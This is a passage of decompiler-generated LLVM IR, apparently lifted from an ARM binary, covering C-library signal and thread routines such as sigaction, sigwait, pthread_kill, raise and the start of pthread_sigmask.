  store i32 %v3_1e2c8, i32* %r6.global-to-local, align 4
  store i32 38396, i32* %r4.global-to-local, align 4
  %v2_1e2d0 = icmp eq i32 %v3_1e2c8, 0
  store i1 %v2_1e2d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1e2d0, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_1e2c8
  store i32 %v2_1e28c, i32* %v2_1e2c8, align 4
  %v1_1e2e4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_1e2c8, %bb
  %v1_1e2e4 = phi i32 [ 38396, %dec_label_pc_1e2c8 ], [ %v1_1e2e4.pre, %bb ]
  %v2_1e2d8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v2_1e2d8, i32* @r1, align 4
  store i32 88, i32* @r2, align 4
  store i32 %v2_1e28c, i32* @r0, align 4
  %v0_1e2e4 = load i32, i32* @ip, align 4
  %v2_1e2e4 = add i32 %v0_1e2e4, %v1_1e2e4
  store i32 %v2_1e2e4, i32* @r4, align 4
  %v0_1e2e8 = call i32 @memcpy()
  %v0_1e2ec = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1e2ec, i32* %r0.global-to-local, align 4
  %v0_1e2fc = load i32, i32* @r4, align 4
  %v4_1e2fc = mul i32 %v0_1e2ec, 4
  %v5_1e2fc = add i32 %v0_1e2fc, %v4_1e2fc
  %v6_1e2fc = inttoptr i32 %v5_1e2fc to i32*
  %v7_1e2fc = load i32, i32* %v6_1e2fc, align 4
  call void @__pseudo_branch(i32 %v7_1e2fc)
  %v0_1e308 = load i32, i32* %r6.global-to-local, align 4
  %v2_1e308 = icmp eq i32 %v0_1e308, 0
  store i1 %v2_1e308, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1e308, label %bb16, label %bb17

bb16:                                             ; preds = %bb15
  %v2_1e30c = load i32, i32* @r5, align 4
  %v3_1e30c = add i32 %v2_1e30c, 84
  %v4_1e30c = inttoptr i32 %v3_1e30c to i32*
  store i32 0, i32* %v4_1e30c, align 4
  br label %bb17

bb17:                                             ; preds = %.thread2._crit_edge, %bb15, %bb16
  store i32 %v3_1e288, i32* %r4.global-to-local, align 4
  %v1_1e318 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1e318

; uselistorder directives
  uselistorder i32 %v0_1e2a0, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 0 }
  uselistorder label %bb17, { 2, 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @__GI_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1e324 = load i32, i32* @r4, align 4
  store i32 %v3_1e324, i32* %stack_var_-20, align 4
  %v6_1e324 = load i32, i32* @r5, align 4
  %v9_1e324 = load i32, i32* @r6, align 4
  %v12_1e324 = load i32, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r6, align 4
  %v4_1e334 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 256) to i32*), align 4
  %v1_1e338 = inttoptr i32 %v4_1e334 to i32*
  %v2_1e338 = load i32, i32* %v1_1e338, align 4
  %v9_1e33c = icmp eq i32 %v2_1e338, %arg1
  store i32 %arg1, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v9_1e33c, label %dec_label_pc_1e440, label %dec_label_pc_1e354

dec_label_pc_1e354:                               ; preds = %entry
  %v4_1e358 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 252) to i32*), align 4
  %v1_1e35c = inttoptr i32 %v4_1e358 to i32*
  %v2_1e35c = load i32, i32* %v1_1e35c, align 4
  %v9_1e360 = icmp eq i32 %v2_1e35c, %arg1
  br i1 %v9_1e360, label %dec_label_pc_1e440, label %dec_label_pc_1e368

dec_label_pc_1e368:                               ; preds = %dec_label_pc_1e354
  %v4_1e36c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 72) to i32*), align 4
  %v1_1e370 = inttoptr i32 %v4_1e36c to i32*
  %v2_1e370 = load i32, i32* %v1_1e370, align 4
  %v9_1e374 = icmp eq i32 %v2_1e370, %arg1
  br i1 %v9_1e374, label %dec_label_pc_1e37c, label %dec_label_pc_1e384

dec_label_pc_1e37c:                               ; preds = %dec_label_pc_1e368
  %v5_1e380 = icmp sgt i32 %arg1, 0
  br i1 %v5_1e380, label %dec_label_pc_1e440, label %dec_label_pc_1e384

dec_label_pc_1e384:                               ; preds = %dec_label_pc_1e368, %dec_label_pc_1e37c
  %v2_1e384 = icmp eq i32* %arg2, null
  br i1 %v2_1e384, label %bb, label %dec_label_pc_1e390

bb:                                               ; preds = %dec_label_pc_1e384
  store i32 0, i32* @r1, align 4
  br label %dec_label_pc_1e3ec

dec_label_pc_1e390:                               ; preds = %dec_label_pc_1e384
  %v2_1e394 = load i32, i32* %arg2, align 4
  store i32 %v2_1e394, i32* %r0.global-to-local, align 4
  %v3_1e394 = add i32 %tmp, 4
  %v4_1e394 = inttoptr i32 %v3_1e394 to i32*
  %v5_1e394 = load i32, i32* %v4_1e394, align 4
  %v9_1e394 = add i32 %tmp, 12
  %v10_1e394 = inttoptr i32 %v9_1e394 to i32*
  %v11_1e394 = load i32, i32* %v10_1e394, align 4
  %v2_1e398 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_1e394, i32* %stack_var_-44, align 4
  %v2_1e3a0 = icmp ne i32 %v2_1e394, 0
  %v7_1e3a0 = icmp eq i32 %v2_1e394, 1
  %v2_1e3a4 = xor i1 %v2_1e3a0, true
  %v3_1e3a4 = or i1 %v7_1e3a0, %v2_1e3a4
  br i1 %v3_1e3a4, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_1e390
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_1e390, %bb23
  %v0_1e3b8.pr8 = phi i32 [ %v11_1e394, %dec_label_pc_1e390 ], [ 0, %bb23 ]
  %v2_1e3a8 = xor i1 %v7_1e3a0, true
  %v3_1e3a8 = and i1 %v2_1e3a0, %v2_1e3a8
  br i1 %v3_1e3a8, label %bb25, label %bb26

bb25:                                             ; preds = %bb24
  br label %bb26

bb26:                                             ; preds = %bb24, %bb25
  %v0_1e3b8.pr = phi i32 [ %v0_1e3b8.pr8, %bb24 ], [ 1, %bb25 ]
  %tmp27 = icmp slt i32 %arg1, 1
  br i1 %tmp27, label %bb28, label %thread-pre-split

bb28:                                             ; preds = %bb26
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb26, %bb28
  %v0_1e3b8 = phi i32 [ 0, %bb28 ], [ %v0_1e3b8.pr, %bb26 ]
  %v2_1e3b8 = icmp eq i32 %v0_1e3b8, 0
  br i1 %v2_1e3b8, label %dec_label_pc_1e3e8, label %dec_label_pc_1e3c4

dec_label_pc_1e3c4:                               ; preds = %thread-pre-split
  %v8_1e3c8 = icmp sgt i32 %arg1, 64
  br i1 %v8_1e3c8, label %dec_label_pc_1e3e8, label %dec_label_pc_1e3cc

dec_label_pc_1e3cc:                               ; preds = %dec_label_pc_1e3c4
  %v1_1e3cc = and i32 %v5_1e394, 4
  %v2_1e3cc = icmp eq i32 %v1_1e3cc, 0
  store i32 %v2_1e398, i32* @r1, align 4
  %. = select i1 %v2_1e3cc, i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -157448), i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -157572)
  store i32 %., i32* %stack_var_-44, align 4
  br label %dec_label_pc_1e3ec

dec_label_pc_1e3e8:                               ; preds = %dec_label_pc_1e3c4, %thread-pre-split
  store i32 %v2_1e398, i32* @r1, align 4
  br label %dec_label_pc_1e3ec

dec_label_pc_1e3ec:                               ; preds = %bb, %dec_label_pc_1e3cc, %dec_label_pc_1e3e8
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r2, align 4
  %v1_1e3f4 = call i32 @__libc_sigaction(i32 %arg1)
  store i32 %v1_1e3f4, i32* %r0.global-to-local, align 4
  %v7_1e3f8 = icmp eq i32 %v1_1e3f4, -1
  br i1 %v7_1e3f8, label %dec_label_pc_1e44c, label %dec_label_pc_1e400

dec_label_pc_1e400:                               ; preds = %dec_label_pc_1e3ec
  %v0_1e400 = load i32, i32* @r5, align 4
  %v1_1e400 = add i32 %v0_1e400, -1
  %tmp32 = icmp ugt i32 %v1_1e400, 63
  br i1 %tmp32, label %dec_label_pc_1e448, label %dec_label_pc_1e40c

dec_label_pc_1e40c:                               ; preds = %dec_label_pc_1e400
  %v0_1e40c = load i32, i32* @r7, align 4
  %v2_1e40c = icmp eq i32 %v0_1e40c, 0
  br i1 %v2_1e40c, label %.thread6, label %bb31

bb31:                                             ; preds = %dec_label_pc_1e40c
  %v1_1e414 = load i32, i32* @r6, align 4
  %v3_1e414 = add i32 %v1_1e414, 38396
  %v5_1e418 = mul i32 %v0_1e400, 4
  %v6_1e418 = add i32 %v3_1e414, %v5_1e418
  %v7_1e418 = inttoptr i32 %v6_1e418 to i32*
  %v8_1e418 = load i32, i32* %v7_1e418, align 4
  %v3_1e41c = inttoptr i32 %v0_1e40c to i32*
  store i32 %v8_1e418, i32* %v3_1e41c, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1e40c, %bb31
  %v0_1e420 = load i32, i32* @r4, align 4
  %v2_1e420 = icmp eq i32 %v0_1e420, 0
  br i1 %v2_1e420, label %dec_label_pc_1e448, label %dec_label_pc_1e428

dec_label_pc_1e428:                               ; preds = %.thread6
  %v1_1e42c = inttoptr i32 %v0_1e420 to i32*
  %v2_1e42c = load i32, i32* %v1_1e42c, align 4
  %v0_1e430 = load i32, i32* @r6, align 4
  %v2_1e430 = add i32 %v0_1e430, 38396
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1e438 = load i32, i32* @r5, align 4
  %v5_1e438 = mul i32 %v2_1e438, 4
  %v6_1e438 = add i32 %v5_1e438, %v2_1e430
  %v7_1e438 = inttoptr i32 %v6_1e438 to i32*
  store i32 %v2_1e42c, i32* %v7_1e438, align 4
  %v1_1e454.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1e44c

dec_label_pc_1e440:                               ; preds = %dec_label_pc_1e37c, %dec_label_pc_1e354, %entry
  store i32 22, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1e44c

dec_label_pc_1e448:                               ; preds = %.thread6, %dec_label_pc_1e400
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1e44c

dec_label_pc_1e44c:                               ; preds = %dec_label_pc_1e3ec, %dec_label_pc_1e440, %dec_label_pc_1e428, %dec_label_pc_1e448
  %v1_1e454 = phi i32 [ %v1_1e3f4, %dec_label_pc_1e3ec ], [ 22, %dec_label_pc_1e440 ], [ %v1_1e454.pre, %dec_label_pc_1e428 ], [ 0, %dec_label_pc_1e448 ]
  %v2_1e450 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1e450, i32* @r4, align 4
  store i32 %v6_1e324, i32* @r5, align 4
  store i32 %v9_1e324, i32* @r6, align 4
  store i32 %v12_1e324, i32* @r7, align 4
  ret i32 %v1_1e454

; uselistorder directives
  uselistorder i32 %v1_1e3f4, { 1, 0, 2 }
  uselistorder i1 %v2_1e3a0, { 1, 0 }
  uselistorder i32 %v2_1e398, { 1, 0 }
  uselistorder i32 %v2_1e394, { 2, 1, 0, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 7, 6, 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 7, 4, 5, 8, 6, 9 }
  uselistorder label %dec_label_pc_1e44c, { 3, 1, 2, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_1e3ec, { 2, 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %dec_label_pc_1e384, { 1, 0 }
}

define i32 @function_1e45c(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1e45c:
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_1e45c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1e45c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1e45c
  %v5_1e45c = mul i32 %tmp, 4
  %v6_1e45c = and i32 %v5_1e45c, %tmp
  %v4_1e460 = inttoptr i32 %v6_1e45c to i32*
  store i32 %v6_1e45c, i32* %v4_1e460, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1e45c, %bb
  %v4_1e464 = phi i32 [ %tmp, %dec_label_pc_1e45c ], [ 0, %bb ]
  ret i32 %v4_1e464

; uselistorder directives
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @sigwait(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_1e474 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r8, align 4
  %v0_1e484 = call i32 @_thread_self.1()
  store i32 252, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* @r6, align 4
  %v2_1e498 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_1e498, i32* %r4.global-to-local, align 4
  store i32 %v0_1e484, i32* %r2.global-to-local, align 4
  store i32 %v2_1e498, i32* @r0, align 4
  store i32 -1, i32* %stack_var_-52, align 4
  %v1_1e4b8 = call i32 @__GI_sigdelset(i32 %v2_1e498)
  %v0_1e4c8 = load i32, i32* @r6, align 4
  %v2_1e4c8 = add i32 %v0_1e4c8, 38396
  store i32 %v2_1e4c8, i32* @sb, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_1e498, i32* @fp, align 4
  %v2_1e4d8 = add i32 %v0_1e4c8, -157756
  store i32 %v2_1e4d8, i32* @sl, align 4
  store i32 1, i32* @r4, align 4
  %v2_1e4e0 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_1e4e0, i32* @r7, align 4
  %v0_1e57821 = load i32, i32* @r8, align 4
  store i32 %v0_1e57821, i32* @r0, align 4
  br label %dec_label_pc_1e4ec

dec_label_pc_1e4ec:                               ; preds = %entry, %dec_label_pc_1e56c
  %v0_1e57823 = phi i32 [ %v0_1e57821, %entry ], [ %v0_1e578, %dec_label_pc_1e56c ]
  %v0_1e57422 = phi i32 [ 1, %entry ], [ %v1_1e56c, %dec_label_pc_1e56c ]
  %v2_1e4ec = call i32 @sigismember(i32 %v0_1e57823, i32 %v0_1e57422)
  %v2_1e4f0 = icmp eq i32 %v2_1e4ec, 0
  br i1 %v2_1e4f0, label %dec_label_pc_1e56c, label %dec_label_pc_1e4f8

dec_label_pc_1e4f8:                               ; preds = %dec_label_pc_1e4ec
  store i32 256, i32* %r2.global-to-local, align 4
  %v0_1e4fc = load i32, i32* @r6, align 4
  %v2_1e4fc = add i32 %v0_1e4fc, 256
  %v3_1e4fc = inttoptr i32 %v2_1e4fc to i32*
  %v4_1e4fc = load i32, i32* %v3_1e4fc, align 4
  %v1_1e500 = inttoptr i32 %v4_1e4fc to i32*
  %v2_1e500 = load i32, i32* %v1_1e500, align 4
  %v0_1e504 = load i32, i32* @r4, align 4
  %v9_1e504 = icmp eq i32 %v0_1e504, %v2_1e500
  br i1 %v9_1e504, label %dec_label_pc_1e56c, label %dec_label_pc_1e50c

dec_label_pc_1e50c:                               ; preds = %dec_label_pc_1e4f8
  %v1_1e50c = load i32, i32* @r5, align 4
  %v2_1e50c = add i32 %v1_1e50c, %v0_1e4fc
  %v3_1e50c = inttoptr i32 %v2_1e50c to i32*
  %v4_1e50c = load i32, i32* %v3_1e50c, align 4
  %v1_1e510 = inttoptr i32 %v4_1e50c to i32*
  %v2_1e510 = load i32, i32* %v1_1e510, align 4
  %v9_1e514 = icmp eq i32 %v0_1e504, %v2_1e510
  br i1 %v9_1e514, label %dec_label_pc_1e56c, label %dec_label_pc_1e51c

dec_label_pc_1e51c:                               ; preds = %dec_label_pc_1e50c
  store i32 72, i32* %r2.global-to-local, align 4
  %v2_1e520 = add i32 %v0_1e4fc, 72
  %v3_1e520 = inttoptr i32 %v2_1e520 to i32*
  %v4_1e520 = load i32, i32* %v3_1e520, align 4
  %v1_1e524 = inttoptr i32 %v4_1e520 to i32*
  %v2_1e524 = load i32, i32* %v1_1e524, align 4
  %v9_1e528 = icmp eq i32 %v0_1e504, %v2_1e524
  store i32 %v2_1e498, i32* @r0, align 4
  br i1 %v9_1e528, label %dec_label_pc_1e56c, label %dec_label_pc_1e538

dec_label_pc_1e538:                               ; preds = %dec_label_pc_1e51c
  %v1_1e538 = call i32 @__GI_sigdelset(i32 %v2_1e498)
  %v0_1e53c = load i32, i32* @sb, align 4
  %v1_1e53c = load i32, i32* @r4, align 4
  %v4_1e53c = mul i32 %v1_1e53c, 4
  %v5_1e53c = add i32 %v4_1e53c, %v0_1e53c
  %v6_1e53c = inttoptr i32 %v5_1e53c to i32*
  %v7_1e53c = load i32, i32* %v6_1e53c, align 4
  %v7_1e53c.cmp = icmp ugt i32 %v7_1e53c, 1
  br i1 %v7_1e53c.cmp, label %dec_label_pc_1e56c, label %dec_label_pc_1e548

dec_label_pc_1e548:                               ; preds = %dec_label_pc_1e538
  store i32 0, i32* @r1, align 4
  store i32 20, i32* @r2, align 4
  store i32 %v2_1e4e0, i32* @r0, align 4
  %v0_1e554 = call i32 @__GI_memset()
  %v0_1e558 = load i32, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1e564 = load i32, i32* @sl, align 4
  store i32 %v0_1e564, i32* %stack_var_-72, align 4
  %v4_1e568 = call i32 @__GI_sigaction(i32 %v0_1e558, i32* nonnull %stack_var_-72, i32 0)
  br label %dec_label_pc_1e56c

dec_label_pc_1e56c:                               ; preds = %dec_label_pc_1e538, %dec_label_pc_1e51c, %dec_label_pc_1e50c, %dec_label_pc_1e4f8, %dec_label_pc_1e4ec, %dec_label_pc_1e548
  %v0_1e56c = load i32, i32* @r4, align 4
  %v1_1e56c = add i32 %v0_1e56c, 1
  store i32 %v1_1e56c, i32* @r4, align 4
  %v0_1e578 = load i32, i32* @r8, align 4
  store i32 %v0_1e578, i32* @r0, align 4
  %v7_1e57c = icmp sgt i32 %v1_1e56c, 65
  br i1 %v7_1e57c, label %dec_label_pc_1e580, label %dec_label_pc_1e4ec

dec_label_pc_1e580:                               ; preds = %dec_label_pc_1e56c
  store i32 1, i32* @r1, align 4
  %v3_1e588 = call i32 @__sigsetjmp(i32* nonnull %stack_var_-344, i32 1)
  %v2_1e58c = icmp eq i32 %v3_1e588, 0
  br i1 %v2_1e58c, label %dec_label_pc_1e594, label %dec_label_pc_1e580.dec_label_pc_1e5dc_crit_edge

dec_label_pc_1e580.dec_label_pc_1e5dc_crit_edge:  ; preds = %dec_label_pc_1e580
  %.pre = add i32 %v0_1e484, 40
  %.pre1 = inttoptr i32 %.pre to i32*
  br label %dec_label_pc_1e5dc

dec_label_pc_1e594:                               ; preds = %dec_label_pc_1e580
  %v2_1e580 = ptrtoint i32* %stack_var_-344 to i32
  store i32 %v0_1e484, i32* %r2.global-to-local, align 4
  %v1_1e59c = add i32 %v0_1e484, 66
  %v2_1e59c = inttoptr i32 %v1_1e59c to i8*
  %v3_1e59c = load i8, i8* %v2_1e59c, align 1
  %v2_1e5a0 = icmp eq i8 %v3_1e59c, 0
  %v2_1e5a8 = add i32 %v0_1e484, 40
  %v3_1e5a8 = inttoptr i32 %v2_1e5a8 to i32*
  store i32 %v2_1e580, i32* %v3_1e5a8, align 4
  br i1 %v2_1e5a0, label %dec_label_pc_1e5c0, label %dec_label_pc_1e5b0

dec_label_pc_1e5b0:                               ; preds = %dec_label_pc_1e594
  %v1_1e5b4 = add i32 %v0_1e484, 64
  %v2_1e5b4 = inttoptr i32 %v1_1e5b4 to i8*
  %v3_1e5b4 = load i8, i8* %v2_1e5b4, align 1
  %v2_1e5b8 = icmp eq i8 %v3_1e5b4, 0
  br i1 %v2_1e5b8, label %dec_label_pc_1e5dc, label %dec_label_pc_1e5c0

dec_label_pc_1e5c0:                               ; preds = %dec_label_pc_1e5b0, %dec_label_pc_1e594
  store i32 %v0_1e484, i32* %r2.global-to-local, align 4
  %v2_1e5c8 = add i32 %v0_1e484, 32
  %v3_1e5c8 = inttoptr i32 %v2_1e5c8 to i32*
  store i32 0, i32* %v3_1e5c8, align 4
  %v2_1e5d0 = load i32, i32* %r2.global-to-local, align 4
  %v3_1e5d0 = add i32 %v2_1e5d0, 88
  %v4_1e5d0 = inttoptr i32 %v3_1e5d0 to i8*
  store i8 1, i8* %v4_1e5d0, align 1
  %v1_1e5d8 = call i32 @__GI_sigsuspend(i32 %v2_1e498)
  br label %dec_label_pc_1e5dc

dec_label_pc_1e5dc:                               ; preds = %dec_label_pc_1e580.dec_label_pc_1e5dc_crit_edge, %dec_label_pc_1e5b0, %dec_label_pc_1e5c0
  %v3_1e5e4.pre-phi = phi i32* [ %.pre1, %dec_label_pc_1e580.dec_label_pc_1e5dc_crit_edge ], [ %v3_1e5a8, %dec_label_pc_1e5b0 ], [ %v3_1e5a8, %dec_label_pc_1e5c0 ]
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %v3_1e5e4.pre-phi, align 4
  %v0_1e5e8 = call i32 @pthread_testcancel()
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v1_1e5f4 = add i32 %v0_1e484, 32
  %v2_1e5f4 = inttoptr i32 %v1_1e5f4 to i32*
  %v3_1e5f4 = load i32, i32* %v2_1e5f4, align 4
  %v0_1e5f8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_1e5f4, i32* %arg2, align 4
  store i32 %v3_1e474, i32* %r4.global-to-local, align 4
  ret i32 %v0_1e5f8

; uselistorder directives
  uselistorder i32 %v0_1e578, { 1, 0 }
  uselistorder i32 %v1_1e56c, { 0, 2, 1 }
  uselistorder i32 %v0_1e4fc, { 1, 0, 2 }
  uselistorder i32 %v2_1e498, { 2, 0, 1, 3, 5, 4, 6 }
  uselistorder i32 %v0_1e484, { 6, 4, 5, 7, 1, 2, 3, 0, 8 }
  uselistorder i32* %stack_var_-344, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 38396, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i32 ()* @_thread_self.1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1e5dc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1e56c, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_1e4ec, { 1, 0 }
}

define i32 @function_1e610(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1e610:
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_1e610 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1e610, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1e610
  store i32 %tmp, i32* %arg1, align 4
  call void @llvm.trap()
  unreachable

.thread1:                                         ; preds = %dec_label_pc_1e610
  ret i32 %tmp
}

define i32 @pthread_kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_1e630 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 84) to i32*), align 4
  %v3_1e638 = urem i32 %arg1, 1024
  %v6_1e63c = load i32, i32* @r5, align 4
  %v9_1e63c = load i32, i32* @r6, align 4
  %v4_1e640 = mul nuw nsw i32 %v3_1e638, 16
  %v5_1e640 = add i32 %v4_1e630, %v4_1e640
  store i32 %v5_1e640, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %v5_1e640, i32* @r0, align 4
  %v0_1e654 = call i32 @__pthread_lock()
  %v0_1e658 = load i32, i32* @r5, align 4
  %v1_1e658 = add i32 %v0_1e658, 8
  %v2_1e658 = inttoptr i32 %v1_1e658 to i32*
  %v3_1e658 = load i32, i32* %v2_1e658, align 4
  %v2_1e65c = icmp eq i32 %v3_1e658, 0
  br i1 %v2_1e65c, label %dec_label_pc_1e670, label %dec_label_pc_1e664

dec_label_pc_1e664:                               ; preds = %entry
  %v1_1e664 = add i32 %v3_1e658, 16
  %v2_1e664 = inttoptr i32 %v1_1e664 to i32*
  %v3_1e664 = load i32, i32* %v2_1e664, align 4
  %v1_1e668 = load i32, i32* @r4, align 4
  %v9_1e668 = icmp eq i32 %v3_1e664, %v1_1e668
  br i1 %v9_1e668, label %dec_label_pc_1e68c, label %dec_label_pc_1e670

dec_label_pc_1e670:                               ; preds = %dec_label_pc_1e664, %entry
  %v1_1e674 = call i32 @__pthread_unlock(i32 %v0_1e658)
  br label %dec_label_pc_1e6b0

dec_label_pc_1e680:                               ; preds = %dec_label_pc_1e68c
  %v0_1e680 = call i32 @__errno_location()
  %v1_1e684 = inttoptr i32 %v0_1e680 to i32*
  %v2_1e684 = load i32, i32* %v1_1e684, align 4
  br label %dec_label_pc_1e6b0

dec_label_pc_1e68c:                               ; preds = %dec_label_pc_1e664
  %v1_1e68c = add i32 %v3_1e658, 20
  %v2_1e68c = inttoptr i32 %v1_1e68c to i32*
  %v3_1e68c = load i32, i32* %v2_1e68c, align 4
  %v1_1e694 = call i32 @__pthread_unlock(i32 %v0_1e658)
  %v0_1e69c = load i32, i32* @r6, align 4
  %v2_1e6a0 = call i32 @kill(i32 %v3_1e68c, i32 %v0_1e69c)
  %v7_1e6a4 = icmp eq i32 %v2_1e6a0, -1
  br i1 %v7_1e6a4, label %dec_label_pc_1e680, label %dec_label_pc_1e6ac

dec_label_pc_1e6ac:                               ; preds = %dec_label_pc_1e68c
  br label %dec_label_pc_1e6b0

dec_label_pc_1e6b0:                               ; preds = %dec_label_pc_1e680, %dec_label_pc_1e670, %dec_label_pc_1e6ac
  %v1_1e6b4 = phi i32 [ %v2_1e684, %dec_label_pc_1e680 ], [ 3, %dec_label_pc_1e670 ], [ 0, %dec_label_pc_1e6ac ]
  store i32 %v6_1e63c, i32* @r5, align 4
  store i32 %v9_1e63c, i32* @r6, align 4
  ret i32 %v1_1e6b4

; uselistorder directives
  uselistorder i32 %v0_1e658, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1e6b0, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1e6c0 = load i32, i32* @r4, align 4
  store i32 %v3_1e6c0, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_1e6c8 = call i32 @__GI_pthread_self()
  %v0_1e6cc = load i32, i32* @r4, align 4
  %v2_1e6d0 = call i32 @pthread_kill(i32 %v0_1e6c8, i32 %v0_1e6cc)
  store i32 %v2_1e6d0, i32* %r4.global-to-local, align 4
  %v2_1e6d4 = icmp eq i32 %v2_1e6d0, 0
  br i1 %v2_1e6d4, label %dec_label_pc_1e6ec, label %dec_label_pc_1e6e0

dec_label_pc_1e6e0:                               ; preds = %entry
  %v0_1e6e0 = call i32 @__errno_location()
  %v0_1e6e4 = load i32, i32* %r4.global-to-local, align 4
  %v2_1e6e4 = inttoptr i32 %v0_1e6e0 to i32*
  store i32 %v0_1e6e4, i32* %v2_1e6e4, align 4
  br label %dec_label_pc_1e6ec

dec_label_pc_1e6ec:                               ; preds = %entry, %dec_label_pc_1e6e0
  %storemerge = phi i32 [ -1, %dec_label_pc_1e6e0 ], [ 0, %entry ]
  %v2_1e6ec = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1e6ec, i32* @r4, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_1e6ec, { 1, 0 }
}

define i32 @pthread_sigmask(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_1e6fc = load i32, i32* %r1.global-to-local, align 4
  %v2_1e6fc = icmp eq i32 %v0_1e6fc, 0
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r4.global-to-local, align 4
  %v2_1e704 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_1e6fc, label %dec_label_pc_1e794, label %dec_label_pc_1e714

dec_label_pc_1e714:                               ; preds = %entry
  %v1_1e714 = inttoptr i32 %v0_1e6fc to i32*
  %v2_1e714 = load i32, i32* %v1_1e714, align 4
  %v3_1e714 = add i32 %v0_1e6fc, 4
